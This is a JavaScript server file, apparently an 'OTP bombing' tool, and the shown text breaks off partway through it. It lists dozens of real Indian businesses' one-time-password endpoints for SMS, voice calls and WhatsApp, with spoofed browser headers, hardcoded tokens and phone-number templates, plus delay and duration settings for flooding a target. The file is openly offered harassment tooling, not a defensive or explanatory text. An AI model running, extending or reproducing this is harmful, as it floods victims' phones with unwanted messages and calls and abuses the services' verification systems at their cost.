// ============================================================
// api_server.js - OTP Bombing API Server (WORKING + UNTESTED)
// 85 Working APIs + 300+ New Untested APIs = 400+ Total
// /stats endpoint shows working/rate-limited status
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// 🔥 CONFIGURATION
const MAX_DURATION_MIN = 10;
const BATCH_DELAY_MS = 100;
const API_DELAY_MS = 50;

// ============================================================
// ===== ALL APIS =====
// ============================================================

const APIS = [
    // ============================================================
    // ✅✅✅ TIER 0 — 85 VERIFIED WORKING APIs (2xx Success) ✅✅✅
    // ============================================================

    // ===== SMS (Working) =====
    {
        name: "Astroyogi_V3_SMS",
        method: "POST",
        url: "https://chang.astroyogi.com/api/UserAccountV2/WebGenerateOtpV3",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; RMX3782) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "Android",
            "authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzg0NDE0ODc0LCJleHAiOjE3OTIxOTA4NzR9.",
            "origin": "https://www.astroyogi.com",
            "referer": "https://www.astroyogi.com/registration/login.aspx"
        },
        data: (phone) => JSON.stringify({ PhoneNumber: phone, PhoneCode: "91", Domain: "Web", CountryId: "IN", IpAddress: "2409:40e4:1143:e495:8000::", CountryCodeByHeader: "IN" })
    },
    {
        name: "SmartCoin_SMS",
        method: "POST",
        url: "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "user_platform": "WEBFLOW",
            "platform_code": "olyv",
            "origin": "https://app.olyv.co.in",
            "referer": "https://app.olyv.co.in/"
        },
        data: (phone) => JSON.stringify({ phone_number: phone, app_version: "100101", channel: "SMS", request_type: "REGISTRATION", onboarding_consent: true })
    },
    {
        name: "DamieCloud_SMS",
        method: "GET",
        url: "https://damiecloud.online/send/{phone}",
        headers: { "User-Agent": "Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36", "Accept": "*/*" }
    },

    // ===== CALL (Working) =====
    {
        name: "Refyne_Call",
        method: "POST",
        url: "https://prod-api.refyne.co.in/auth/v2/send-otp",
        headers: {
            "Content-Type": "application/json",
            "Authorization": "Bearer",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4)"
        },
        data: (phone) => JSON.stringify({ channel: "IVR", recipient: phone })
    },
    {
        name: "TataCapital_Voice",
        method: "POST",
        url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        headers: { "Content-Type": "application/json; charset=utf-8", "User-Agent": "okhttp/3.9.1" },
        data: (phone) => JSON.stringify({ phone: phone, applSource: "", isOtpViaCallAtLogin: "true" })
    },
    {
        name: "Astrosage_Call",
        method: "GET",
        url: "https://varta.astrosage.com/sdk/send-otp-via-call?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&operation_name=blank&jsonpcall=1&fromresend=0&_=0",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
            "Accept": "*/*",
            "X-Requested-With": "pure.lite.browser",
            "Referer": "http://www.astrosage.com/"
        }
    },

    // ===== WHATSAPP (Working) =====
    {
        name: "Breeze_WA",
        method: "POST",
        url: "https://api.breeze.in/session/start",
        headers: { "Content-Type": "application/json", "x-device-id": "A1pKVEDhlv66KLtoYsml3", "x-session-id": "MUUdODRfiL8xmwzhEpjN8" },
        data: (phone) => JSON.stringify({ phoneNumber: phone, authVerificationType: "otp", device: { id: "A1pKVEDhlv66KLtoYsml3", platform: "Chrome", type: "Desktop" }, countryCode: "+91" })
    },
    {
        name: "GoKwik_WA",
        method: "POST",
        url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        headers: { "accept": "application/json", "content-type": "application/json", "gk-merchant-id": "19g6im8srkz9y" },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },
    {
        name: "Redcliffe_WA",
        method: "POST",
        url: "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false",
        headers: { "accept": "application/json", "content-type": "application/json" },
        data: (phone) => JSON.stringify({ phone_number: phone, short: true, country_code: "+91" })
    },
    {
        name: "Licious_WA",
        method: "POST",
        url: "https://www.licious.in/api/login/signup",
        headers: { "Accept": "application/json", "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone, captcha_token: null })
    },
    {
        name: "OYO_WA",
        method: "POST",
        url: "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        headers: { "Accept": "application/json", "Content-Type": "text/plain;charset=UTF-8", "Cookie": "user_id=none; country_code=IN;" },
        data: (phone) => JSON.stringify({ phone: phone, country_code: "+91", nod: 4 })
    },
    {
        name: "KPNFresh_WA",
        method: "POST",
        url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        headers: { "x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587", "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone_number: { country_code: "+91", number: phone } })
    },
    {
        name: "AdityaBirla_WA",
        method: "POST",
        url: "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP",
        headers: { "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest" },
        data: { "_raw": "MobileNumber={phone}&functionality=signup" }
    },
    {
        name: "IIFL_WA",
        method: "POST",
        url: "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1",
        headers: { "content-type": "application/x-www-form-urlencoded", "x-requested-with": "XMLHttpRequest" },
        data: { "_raw": "apply_for=18&full_name=Adnvs+Signh&mobile_number={phone}&terms_and_condition=1" }
    },
    {
        name: "TradeIndia_WA",
        method: "POST",
        url: "https://apis.tradeindia.com/app_login_api/login_app",
        headers: { "accept": "application/json", "content-type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: "+91" + phone })
    },
    {
        name: "AstroSage_WA",
        method: "GET",
        url: "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&jsonpcall=1&fromresend=0&operation_name=blank",
        headers: { "accept": "*/*", "referer": "https://www.astrosage.com/" }
    },
    {
        name: "BharatLoan_WA",
        method: "POST",
        url: "https://www.bharatloan.com/login-sbm",
        headers: {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.bharatloan.com",
            "Referer": "https://www.bharatloan.com/apply-now",
            "X-Requested-With": "XMLHttpRequest"
        },
        data: { "_raw": "mobile={phone}&current_page=login&is_existing_customer=2" }
    },
    {
        name: "Pagarbook_WA",
        method: "POST",
        url: "https://api.pagarbook.com/api/v5/auth/otp/request",
        headers: { "accept": "application/json", "appversioncode": "5268", "clientplatform": "WEB", "content-type": "application/json", "userrole": "EMPLOYER" },
        data: (phone) => JSON.stringify({ phone: phone, language: 1 })
    },
    {
        name: "55Club_WA",
        method: "POST",
        url: "https://api.55clubapi.com/api/webapi/SmsVerifyCode",
        headers: { "accept": "application/json", "content-type": "application/json;charset=UTF-8", "origin": "https://55club08.in", "referer": "https://55club08.in/" },
        data: (phone) => JSON.stringify({ phone: "91" + phone, codeType: 1, language: 0, random: "35ae48f136d74b279dbd0eeb2504e7f8", signature: "78A2879A0D46B65D257F9B29354B5DBA", timestamp: 1715445820 })
    },
    {
        name: "Zerodha_WA",
        method: "POST",
        url: "https://zerodha.com/account/registration.php",
        headers: { "accept": "*/*", "content-type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone, source: "zerodha", partner_id: "" })
    },
    {
        name: "Testbook_WA",
        method: "POST",
        url: "https://api.testbook.com/api/v2/mobile/signup?mobile={phone}&clientId=1117490662.1715447223",
        headers: { "accept": "application/json", "content-type": "application/json", "x-tb-client": "web,1.2" },
        data: (phone) => JSON.stringify({ firstVisitSource: { type: "organic", utm_source: "google", utm_medium: "organic" }, mobile: phone, signupDetails: { page: "HomePage" } })
    },
    {
        name: "MediBuddy_WA",
        method: "POST",
        url: "https://loginprod.medibuddy.in/unified-login/user/register",
        headers: { "accept": "application/json", "content-type": "application/json" },
        data: (phone) => JSON.stringify({ source: "medibuddyInWeb", platform: "medibuddy", phonenumber: phone, flow: "Retail-Login-Home-Flow" })
    },
    {
        name: "Tyreplex_WA",
        method: "POST",
        url: "https://www.tyreplex.com/includes/ajax/gfend.php",
        headers: {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.tyreplex.com",
            "Referer": "https://www.tyreplex.com/login",
            "X-Requested-With": "XMLHttpRequest"
        },
        data: { "_raw": "perform_action=sendOTP&mobile_no={phone}&action_type=order_login" }
    },
    {
        name: "Moglix_WA",
        method: "POST",
        url: "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        headers: { "accept": "application/json", "content-type": "application/json", "origin": "https://www.moglix.com", "referer": "https://www.moglix.com/" },
        data: (phone) => JSON.stringify({ email: "", phone: phone, type: "p", source: "signup", buildVersion: "DESKTOP-7.3", device: "desktop" })
    },
    {
        name: "Xylem_WA",
        method: "POST",
        url: "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
        headers: { "client-version": "300", "Authorization": "Bearer", "Content-Type": "application/json", "Accept": "application/json, text/plain, */*", "Referer": "https://www.xylem.live/", "randomId": "bfc4e54e-1873-48cc-823e-40d401d9dbb4", "client-id": "64254d66be2a390018e6d348", "client-type": "WEB" },
        data: (phone) => JSON.stringify({ mobile: phone, countryCode: "+91", firstName: "Anant Ambani" })
    },
    {
        name: "Vidyakul_WA",
        method: "POST",
        url: "https://vidyakul.com/signup-otp/send",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://vidyakul.com",
            "referer": "https://vidyakul.com/class-12th/test-series",
            "x-csrf-token": "el0GIsHQSO3Y4upLoQOm3coVWNEiNtiKJONg2LJx",
            "x-requested-with": "XMLHttpRequest"
        },
        data: { "_raw": "phone={phone}" }
    },
    {
        name: "Vedantu_WA",
        method: "POST",
        url: "https://user.vedantu.com/user/preLoginVerification",
        headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.vedantu.com", "referer": "https://www.vedantu.com/register" },
        data: (phone) => JSON.stringify({ email: null, phoneCode: "+91", phoneNumber: phone, sType: "VEDANTU_F_7_N", sValue: "FC34EE3ED23399CD7622BA1851D3E", token: "5nXaR2BzqApBb3Wf", ver: "1772629389", version: 2, whatsappCommunicationEnabled: false })
    },
    {
        name: "Unacademy_WA",
        method: "POST",
        url: "https://unacademy.com/api/v3/user/user_check/?enable-email=true",
        headers: { "accept": "*/*", "content-type": "application/json", "x-platform": "0" },
        data: (phone) => JSON.stringify({ country_code: "IN", phone: phone, is_un_teach_user: false, otp_type: 2.0, send_otp: true, email: "" })
    },
    {
        name: "Myntra_WA",
        method: "POST",
        url: "https://www.myntra.com/gateway/v1/auth/getotp",
        headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.myntra.com", "referer": "https://www.myntra.com/login", "deviceid": "8b9a6835-e2e0-42ec-9e0f-290e5e7e5a6f", "x-myntraweb": "Yes", "x-requested-with": "browser", "x-location-context": "pincode=276304;source=IP", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36" },
        data: (phone) => JSON.stringify({ phoneNumber: phone, signup: "ONECLICK" })
    },
    {
        name: "IndiaMart_WA",
        method: "POST",
        url: "https://m.indiamart.com/ajaxrequest/identified/common/login",
        headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://m.indiamart.com", "referer": "https://m.indiamart.com/login/" },
        data: (phone) => JSON.stringify({ GEOIP_COUNTRY_ISO: "IN", IP: "47.9.35.50", IPADDRESS: "47.9.35.50", IP_COUNTRY: "India", ciso: "IN", duplicateEmailCheck: "", glid: "", glusr_usr_ip: "47.9.35.50", originalreferer: "https://m.indiamart.com/login/", pass: "", ph_code: "91", use: phone })
    },
    {
        name: "CityMallWeb_WA",
        method: "POST",
        url: "https://citymall.live/web-api/auth/send-otp",
        headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json", "host": "citymall.live", "origin": "https://citymall.live", "referer": "https://citymall.live/", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36" },
        data: (phone) => JSON.stringify({ phone_number: phone })
    },
    {
        name: "Zepto_WA",
        method: "POST",
        url: "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
        headers: { "Content-Type": "application/json", "Accept": "application/json", "Origin": "https://www.zepto.com", "Referer": "https://www.zepto.com/" },
        data: (phone) => JSON.stringify({ mobileNumber: phone, countryCode: "+91" })
    },

    // ===== TIER 1 — OLD RELIABLE (Working) =====
    {
        name: "GetInstaCash",
        method: "POST",
        url: "https://getinstacash.in/sell/getData.php",
        headers: {
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://getinstacash.in",
            "Referer": "https://getinstacash.in/sell/login"
        },
        data: { "_raw": "type=sendOTP&mobile={phone}" }
    },
    {
        name: "Flipkart_2",
        method: "GET",
        url: "https://img1a.flixcart.com/batman-returns/batman-returns/p/images/logo_lite-cbb357.png",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "Accept": "*/*",
            "Referer": "https://www.flipkart.com/login/verify?type=mobile&verificationType=otp&loginIdentifier={phone}&loginIdentifierPrefix=%2B91&sourceContext=default"
        }
    },
    {
        name: "AakashDigital_2",
        method: "POST",
        url: "https://digital.aakash.ac.in/signup-otp-verify",
        headers: {
            "accept": "*/*", "origin": "https://digital.aakash.ac.in", "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://digital.aakash.ac.in/user/register"
        },
        data: { "_raw": "&mobileval={phone}" }
    },
    {
        name: "RedBus_1",
        method: "GET",
        url: "https://m.redbus.in/api/getOtp?number={phone}&cc=91&whatsAppOpted=undefined",
        headers: {
            "accept": "application/json, text/plain, */*",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "referer": "https://m.redbus.in/preregister"
        }
    },
    {
        name: "Snapdeal",
        method: "POST",
        url: "https://m.snapdeal.com/signupCompleteAjax",
        headers: {
            "xc": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In19",
            "h2": "true",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "xg": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In0sInVpZCI6eyJndWlkIjoiMWMwNzhhMTMtZGU1My00ZDRkLTkwOTgtNzFmM2JlOTY5YjJiIn19fHwxNjAwODEzMDIyNTk1",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "u": "160081122259159083", "accept": "*/*", "origin": "https://m.snapdeal.com", "referer": "https://m.snapdeal.com/signin"
        },
        data: { "_raw": "j_password=null&j_mobilenumber={phone}&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy" }
    },
    {
        name: "Quikr",
        method: "POST",
        url: "https://www.quikr.com/core/sendOtp?_t=0e2ed2ef8cff0015a917b9cf98ccaea3",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "accept": "*/*",
            "origin": "https://www.quikr.com", "referer": "https://www.quikr.com/"
        },
        data: { "_raw": "user={phone}&v3=true" }
    },

    // ===== TIER 2 — OLD PURANI WORKING =====
    {
        name: "Ogonn",
        method: "POST",
        url: "https://ogonn.in/otp",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01", "origin": "https://ogonn.in",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "referer": "https://ogonn.in/login"
        },
        data: { "_raw": "_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile={phone}" }
    },
    {
        name: "AakashDigital_1",
        method: "POST",
        url: "https://digital.aakash.ac.in/mkt-signup-otp-verify",
        headers: {
            "accept": "*/*", "origin": "https://digital.aakash.ac.in", "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "referer": "https://digital.aakash.ac.in/"
        },
        data: { "_raw": "&mobileval={phone}&otp=6230" }
    },
    {
        name: "Flipkart_1",
        method: "POST",
        url: "https://1.rome.api.flipkart.com/1/action/view",
        headers: {
            "x-user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5FKUA/msite/0.0.3/msite/Mobile",
            "Origin": "https://www.flipkart.com",
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/json", "Accept": "*/*", "Referer": "https://www.flipkart.com/login"
        },
        data: {
            "actionRequestContext": {
                "type": "LOGIN_IDENTITY_VERIFY", "loginIdPrefix": "+91", "loginId": "{phone}",
                "clientQueryParamMap": { "ret": "/?affid=siteplug&affExtParam1=e2f29ff2e3dd9e65eb9e419d30dc8135", "entryPage": "HOMEPAGE_HEADER_ACCOUNT" },
                "loginType": "MOBILE", "verificationType": "OTP", "screenName": "LOGIN_V4_MOBILE", "sourceContext": "DEFAULT"
            }
        }
    },

    // ===== TIER 3 — OLD NAYI WORKING =====
    {
        name: "KPN WhatsApp",
        url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        method: "POST",
        headers: { "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8" },
        data: (phone) => JSON.stringify({ notification_channel: "WHATSAPP", phone_number: { country_code: "+91", number: phone } })
    },
    {
        name: "Hungama OTP",
        url: "https://communication.api.hungama.com/v1/communication/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un" })
    },

    // ===== OLD NEW WORKING =====
    {
        name: "Delhivery",
        method: "GET",
        url: "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={phone}",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "accept": "*/*"
        }
    },

    // ===== NEW WORKING — 9 APIs =====
    {
        name: "JioSaavn", url: "https://api1.jiosaavn.com/jio/sendOtp?__call=jio%2FsendOtp&api_version=4&_format=json&_marker=0&ctx=wap6dot0",
        method: "POST", headers: { "Content-Type": "application/json", "Origin": "https://www.jiosaavn.com", "Referer": "https://www.jiosaavn.com/" },
        data: (phone) => JSON.stringify({ phone_number: "+91" + phone })
    },
    {
        name: "Naaptol", url: "https://www.naaptol.com/faces/jsp/ajax/ajax.jsp",
        method: "POST",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.naaptol.com", "pagesecuritytoken": "DE3NzMzMTY2NTY3NTZfVkBAcHRvbF83MzA1ODUyba",
            "referer": "https://www.naaptol.com/", "x-requested-with": "XMLHttpRequest"
        },
        data: (phone) => JSON.stringify({ actionname: "checkMobileUserExistsForTvApp", mobile: phone })
    },
    {
        name: "Zepto", url: "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
        method: "POST", headers: { "Content-Type": "application/json", "Accept": "application/json", "Origin": "https://www.zepto.com", "Referer": "https://www.zepto.com/" },
        data: (phone) => JSON.stringify({ mobileNumber: phone })
    },
    {
        name: "Factori", url: "https://factori.com/login/check_user_exists",
        method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded", "origin": "https://factori.com", "referer": "https://factori.com/my-account" },
        data: { "_raw": "mobNumber={phone}&countryCode=91" }
    },
    {
        name: "Smytten", url: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        method: "POST", headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone, email: "test@example.com" })
    },
    {
        name: "Tata Capital Business", url: "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
        method: "POST", headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobileNumber: phone, deviceOs: "Android", sourceName: "MitayeFaasleWebsite" })
    },

    // ===== NAYI UNTESTED APIs (Working ones) =====
    {
        name: "Wellness_Forever", url: "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
        method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: (phone) => ({ "_raw": `method=firstRegisterApi&data={"customerMobile":"${phone}","generateOtp":"true"}` })
    },
    {
        name: "TataCapital_Retail", url: "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner", method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.tatacapital.com", "referer": "https://www.tatacapital.com/" },
        data: (phone) => JSON.stringify({ header: { authToken: "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==", identifier: "nli" }, body: { mobileNumber: phone } })
    },
    {
        name: "Animall", url: "https://animall.in/zap/auth/login", method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ phone: phone, signupPlatform: "NATIVE_ANDROID" })
    },
    {
        name: "Swipe", url: "https://app.getswipe.in/api/user/mobile_login", method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ mobile: phone, resend: true })
    },
    {
        name: "Wrogn", url: "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp", method: "POST",
        headers: { "accept": "*/*", "action": "sendOTP", "content-type": "application/json", "origin": "https://wrogn.com", "referer": "https://wrogn.com/", "shop_name": "wrogn-website.myshopify.com" },
        data: (phone) => JSON.stringify({ username: "+91" + phone, type: "mobile", domain: "wrogn.com", recaptcha_token: "" })
    },
    {
        name: "Entri", url: "https://entri.app/api/v3/users/check-phone/", method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ phone: phone })
    },
    {
        name: "Aakash_Anthe", url: "https://antheapi.aakash.ac.in/api/generate-lead-otp", method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.aakash.ac.in", "referer": "https://www.aakash.ac.in/", "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763" },
        data: (phone) => JSON.stringify({ mobile_psid: phone, mobile_number: "", activity_type: "aakash-myadmission", webengageData: { profile: "student", whatsapp_opt_in: true, method: "mobile" } })
    },
    {
        name: "ServeTel", url: "https://api.servetel.in/v1/auth/otp", method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
        data: { "_raw": "mobile_number={phone}" }
    },
    {
        name: "RupeeRedee", url: "https://webservice-in-prod.rupeeredee.com/gate/api/v1/OTP", method: "POST",
        headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "applicationid": "", "deviceid": "abc-uuid", "platform": "Web", "origin": "https://www.rupeeredee.com", "referer": "https://www.rupeeredee.com/" },
        data: (phone) => JSON.stringify({ number: "+91" + phone, type: "Mobile" })
    },
    {
        name: "BlinkrLoan", url: "https://backend.blinkrloan.com/api/user/v3/send-otp", method: "POST",
        headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "withCredentials": "true", "Origin": "https://www.blinkrloan.com", "Referer": "https://www.blinkrloan.com/" },
        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone, lat: "26.123456", lng: "77.123456", url: "https://www.blinkrloan.com/apply/pan-mobile" })
    },

    // ===== NAYI 8 APIs (Working) =====
    {
        name: "RealEstateIndia_Call", url: "https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php", method: "POST",
        headers: { "x-requested-with": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "action_id=call_to_otp&mob_num={phone}&member_id=1547045" }
    },
    {
        name: "MagicBricks_Call", url: "https://api.magicbricks.com/bricks/verifyOnCall.html?mobile={phone}", method: "GET", headers: {}
    },
    {
        name: "Havells_WA", url: "https://havells.com/otplogin/account/otploginpost/", method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "form_key=GvFYqgGVWCkuLoNT&mobile_number={phone}&is_whatsapp_promo=on" }
    },
    {
        name: "HeroFinCorp_WA", url: "https://loans.apps.herofincorp.com/api/generateOtp", method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ phone: phone, terms: true, whatsapp: true })
    },

    // ===== 6 NAYI WORKING APIs =====
    {
        name: "RoyalChallengers", url: "https://shop.royalchallengers.com/api/customer/login",
        method: "POST",
        headers: { "Content-Type": "application/json", "user-agent": "okhttp/3.9.1" },
        data: (phone) => JSON.stringify({ utype: "Online", mobile: phone, email: "" })
    },
    {
        name: "Cashify", url: "https://www.cashify.in/api/cu01/v1/app-link?mn={phone}",
        method: "GET", headers: { "user-agent": "okhttp/3.9.1" }
    },
    {
        name: "Tradgo", url: "https://tradgo.in/appapi4/Forgot_password_new/getOtp",
        method: "POST", headers: { "Content-Type": "application/json", "User-Agent": "okhttp/3.9.1" },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "Gapoon", url: "https://www.gapoon.com/userSignup",
        method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "mobile={phone}&email=noreply@gmail.com&name=LexLuthor" }
    },
    {
        name: "AllenSolly", url: "https://www.allensolly.com/capillarylogin/validateMobileOrEMail",
        method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "mobileoremail={phone}&name=markluther" }
    },
    {
        name: "Jockey_WhatsApp", url: "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        method: "GET",
        headers: { "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36", "accept": "*/*" }
    },

    // ===== ADDITIONAL WORKING APIs =====
    {
